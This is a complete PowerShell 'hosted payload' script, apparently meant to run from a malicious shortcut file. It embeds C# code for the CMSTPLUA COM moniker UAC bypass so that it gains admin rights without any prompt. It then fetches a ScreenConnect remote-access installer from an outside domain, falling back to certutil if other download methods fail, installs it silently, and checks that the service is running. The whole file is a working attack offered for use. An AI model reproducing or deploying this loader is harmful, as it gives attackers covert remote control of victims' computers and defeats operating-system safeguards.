<#
    pay.ps1  -  hosted payload. Fetches the package, verifies it, installs it,
                and logs every step so a failure is never silent.

    Upload this file to
      https://raw.githubusercontent.com/paoladialcad-ship-it/file/refs/heads/main/pay.ps1

    Optional environment overrides (set before the .lnk is launched):
      PAY_URL       package URL
      PAY_HASH      expected SHA-256, install refuses on mismatch
      PAY_LOG_DIR   log directory (default C:\Temp)
      PAY_DEBUG=dry context only, no download / no install

    Exit codes: 0 ok | 2 download failed | 3 hash mismatch | 4 install failed
#>

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

# --------------------------------------------------------------------------
# logging - both targets, never throws
# --------------------------------------------------------------------------
$LogDir = $env:PAY_LOG_DIR
if (-not $LogDir) { $LogDir = 'C:\Temp' }
if (-not (Test-Path -LiteralPath $LogDir)) {
    New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
}
$LogPath    = Join-Path $LogDir 'Execution_Status.log'
$DesktopLog = Join-Path ([Environment]::GetFolderPath('Desktop')) 'Execution_Status.log'

function Write-Log {
    param([string]$Message)
    $entry = '[' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + '] ' + $Message
    foreach ($p in @($LogPath, $DesktopLog)) {
        try { Add-Content -LiteralPath $p -Value $entry -Encoding UTF8 -ErrorAction Stop } catch { }
    }
    try { Write-Host $entry } catch { }
}

$T0 = Get-Date
if ($PSCommandPath) { Write-Log ('[*] payload start pid=' + $PID + ' src=' + $PSCommandPath) }
else { Write-Log ('[*] payload start pid=' + $PID + ' src=iex') }

# --------------------------------------------------------------------------
# config
# --------------------------------------------------------------------------
$Url = $env:PAY_URL
if (-not $Url) {
    $Url = 'https://cibiconline.co/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=mine&c=&c=&c=&c=&c=&c='
}
$ExpectHash = $env:PAY_HASH
$Dry        = ($env:PAY_DEBUG -eq 'dry')

$MsiPath = Join-Path $env:TEMP 'ScreenConnect.msi'
$MsiLog  = Join-Path $env:TEMP 'ScreenConnect_msi.log'

# --------------------------------------------------------------------------
# CMSTPLUA elevation - instantiate {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
# through the "Elevation:Administrator!new:" moniker, then ICMLuaUtil::ShellExec.
# Same primitive as the C++ PoC; the explorer.exe injection it shipped with is
# not part of the technique and is dropped here.
# --------------------------------------------------------------------------
$CmluSource = @'
using System;
using System.Runtime.InteropServices;

public static class CmluBypass
{
    [DllImport("ole32.dll", CharSet = CharSet.Unicode, PreserveSig = true)]
    private static extern int CoInitializeEx(IntPtr pvReserved, uint coInit);

    [DllImport("ole32.dll", PreserveSig = true)]
    private static extern int CoGetObject(string pszName, IntPtr pBindOpts, ref Guid riid, out IntPtr ppv);

    [StructLayout(LayoutKind.Sequential)]
    private struct BIND_OPTS3
    {
        public int cbStruct;
        public int grfFlags;
        public int grfMode;
        public int dwTickCountDeadline;
        public int dwClassContext;
        public IntPtr pServerInfo;
        public IntPtr hwnd;
    }

    [ComImport, Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C"),
     InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface ICMLuaUtil
    {
        void M1(); void M2(); void M3(); void M4(); void M5(); void M6();

        [PreserveSig]
        int ShellExec([MarshalAs(UnmanagedType.LPWStr)] string file,
                      [MarshalAs(UnmanagedType.LPWStr)] string args,
                      [MarshalAs(UnmanagedType.LPWStr)] string dir,
                      uint mask, int show);
    }

    private const string Moniker =
        "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";

    public static int Run(string file, string args, string dir, uint mask, int show)
    {
        CoInitializeEx(IntPtr.Zero, 2);

        Guid iid = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");
        BIND_OPTS3 bo = new BIND_OPTS3();
        bo.cbStruct = Marshal.SizeOf(typeof(BIND_OPTS3));
        bo.dwClassContext = 4;

        IntPtr pbo = Marshal.AllocCoTaskMem(bo.cbStruct);
        Marshal.StructureToPtr(bo, pbo, false);

        IntPtr pv = IntPtr.Zero;
        int hr;
        try { hr = CoGetObject(Moniker, pbo, ref iid, out pv); }
        finally { Marshal.FreeCoTaskMem(pbo); }

        if (hr != 0 || pv == IntPtr.Zero) return hr;

        try
        {
            ICMLuaUtil o = (ICMLuaUtil)Marshal.GetObjectForIUnknown(pv);
            return o.ShellExec(file, args, dir, mask, show);
        }
        finally { Marshal.Release(pv); }
    }
}
'@

function Invoke-Cmstplua {
    param([string]$File, [string]$Arguments = '', [int]$Show = 0)
    try { Add-Type -TypeDefinition $CmluSource -ErrorAction Stop }
    catch { if ($_.Exception.Message -notmatch 'already exists') { throw } }
    return [CmluBypass]::Run($File, $Arguments, $null, 0, $Show)
}

# --------------------------------------------------------------------------
# context
# --------------------------------------------------------------------------
$IsAdmin = $false
try {
    $id  = [Security.Principal.WindowsIdentity]::GetCurrent()
    $pr  = New-Object Security.Principal.WindowsPrincipal -ArgumentList $id
    $IsAdmin = $pr.IsInRole('Administrator')
    $bld = ''
    try { $bld = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion } catch { }
    Write-Log ('[*] ctx ps=' + $PSVersionTable.PSVersion + ' win=' + [Environment]::OSVersion.VersionString + ' build=' + $bld)
    Write-Log ('[*] ctx user=' + $id.Name + ' admin=' + $IsAdmin + ' lang=' + $ExecutionContext.SessionState.LanguageMode)
} catch { Write-Log ('[-] ctx failed: ' + $_.Exception.Message) }

if ($Dry) {
    Write-Log '[*] dry run - stopping before download'
    exit 0
}

# --------------------------------------------------------------------------
# elevation - the per-machine MSI needs an admin token. Get one through the
# CMSTPLUA auto-elevate moniker instead of showing the user a UAC prompt.
# --------------------------------------------------------------------------
if ($IsAdmin) {
    Write-Log '[*] already elevated'
} elseif ($env:PAY_ELEVATED -eq '1') {
    Write-Log '[-] not elevated even after elevation attempt - continuing anyway'
} elseif (-not $PSCommandPath) {
    Write-Log '[-] not elevated and running from iex - cannot self-elevate'
} else {
    Write-Log '[*] not elevated - requesting elevation via CMSTPLUA'
    $env:PAY_ELEVATED = '1'   # inherited by the child; stops a retry loop
    $psExe  = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
    $psArgs = '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $PSCommandPath + '"'
    try {
        $hr = Invoke-Cmstplua -File $psExe -Arguments $psArgs -Show 0
        Write-Log ('[*] cmstplua hr=0x{0:X8}' -f $hr)
        if ($hr -eq 0) {
            Write-Log '[*] elevated instance launched - this instance exits'
            exit 0
        }
        Write-Log '[-] elevation refused - continuing unelevated (install will fail 1603)'
    } catch {
        Write-Log ('[-] elevation unavailable: ' + $_.Exception.Message)
    }
}

# --------------------------------------------------------------------------
# download - three tiers, first success wins
# --------------------------------------------------------------------------
Write-Log ('[*] target ' + $Url)

function Get-FileTiered {
    param([string]$Address, [string]$OutFile)

    $tiers = @(
        @{ Name = 'iwr'; Act = {
            Invoke-WebRequest -Uri $Address -UseBasicParsing -OutFile $OutFile -TimeoutSec 120
        } },
        @{ Name = 'webclient'; Act = {
            $wc = New-Object Net.WebClient
            $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
            $wc.DownloadFile($Address, $OutFile)
        } },
        @{ Name = 'certutil'; Act = {
            $p = Start-Process -FilePath (Join-Path $env:SystemRoot 'System32\certutil.exe') `
                 -ArgumentList ('-urlcache -f -split "' + $Address + '" "' + $OutFile + '"') `
                 -PassThru -Wait -WindowStyle Hidden
            if ($p.ExitCode -ne 0 -or -not (Test-Path -LiteralPath $OutFile)) { throw ('certutil exit ' + $p.ExitCode) }
        } }
    )

    foreach ($t in $tiers) {
        $sw = [Diagnostics.Stopwatch]::StartNew()
        try {
            if (Test-Path -LiteralPath $OutFile) { Remove-Item -LiteralPath $OutFile -Force }
            & $t.Act
            $size = (Get-Item -LiteralPath $OutFile -ErrorAction Stop).Length
            if ($size -le 0) { throw 'downloaded file is empty' }
            Write-Log ('[+] download via ' + $t.Name + ' ok, ' + $size + ' bytes in ' + $sw.ElapsedMilliseconds + 'ms')
            return $true
        } catch {
            Write-Log ('[-] download via ' + $t.Name + ' failed after ' + $sw.ElapsedMilliseconds + 'ms: ' + $_.Exception.Message)
        }
    }
    return $false
}

try {
    $ok = Get-FileTiered -Address $Url -OutFile $MsiPath
} catch {
    Write-Log ('[-] download fatal: ' + $_.Exception.Message)
    $ok = $false
}
if (-not $ok) {
    Write-Log '[-] all download methods failed'
    exit 2
}

Write-Log ('[+] payload written to ' + $MsiPath)

# --------------------------------------------------------------------------
# integrity
# --------------------------------------------------------------------------
try {
    $hash = (Get-FileHash -LiteralPath $MsiPath -Algorithm SHA256).Hash
    Write-Log ('[*] sha256 ' + $hash)
    if ($ExpectHash -and ($hash -ne $ExpectHash.ToUpper())) {
        Write-Log ('[-] hash mismatch, expected ' + $ExpectHash.ToUpper())
        exit 3
    }
} catch { Write-Log ('[-] hash failed: ' + $_.Exception.Message) }

try { Unblock-File -LiteralPath $MsiPath -ErrorAction SilentlyContinue } catch { }

# --------------------------------------------------------------------------
# install
# --------------------------------------------------------------------------
$MsiArgs = '/i "' + $MsiPath + '" /qn /norestart /l*v "' + $MsiLog + '"'
Write-Log ('[*] exec msiexec ' + $MsiArgs)
$iw = [Diagnostics.Stopwatch]::StartNew()
try {
    $proc = Start-Process -FilePath (Join-Path $env:SystemRoot 'System32\msiexec.exe') `
              -ArgumentList $MsiArgs -PassThru -Wait
    $map = @{ 0 = 'success'; 1602 = 'user cancel'; 1603 = 'fatal, usually needs elevation';
              1619 = 'cannot open package'; 1625 = 'blocked by policy'; 1633 = 'unsupported platform';
              1638 = 'already installed'; 3010 = 'reboot required' }
    $why = $map[$proc.ExitCode]
    if (-not $why) { $why = 'unmapped' }
    Write-Log ('[+] msiexec exit=' + $proc.ExitCode + ' (' + $why + ') in ' + $iw.ElapsedMilliseconds + 'ms, log ' + $MsiLog)
    if ($proc.ExitCode -ne 0 -and $proc.ExitCode -ne 3010) { exit 4 }
} catch {
    Write-Log ('[-] install failed: ' + $_.Exception.Message)
    exit 4
}

# --------------------------------------------------------------------------
# verify
# --------------------------------------------------------------------------
try {
    $keys = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )
    Get-ItemProperty $keys -ErrorAction SilentlyContinue |
        Where-Object { $_.DisplayName -match 'ScreenConnect|ConnectWise' } |
        ForEach-Object { Write-Log ('[+] installed: ' + $_.DisplayName + ' ' + $_.DisplayVersion) }
} catch { }

try {
    Get-Service -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match 'ScreenConnect' } |
        ForEach-Object { Write-Log ('[+] service ' + $_.Name + ' ' + $_.Status) }
} catch { }

try {
    Get-Process -ErrorAction SilentlyContinue |
        Where-Object { $_.ProcessName -match 'ScreenConnect' } |
        ForEach-Object { Write-Log ('[+] process ' + $_.ProcessName + ' pid=' + $_.Id) }
} catch { }

Write-Log ('[*] payload done in ' + [int]((Get-Date) - $T0).TotalMilliseconds + 'ms')
exit 0
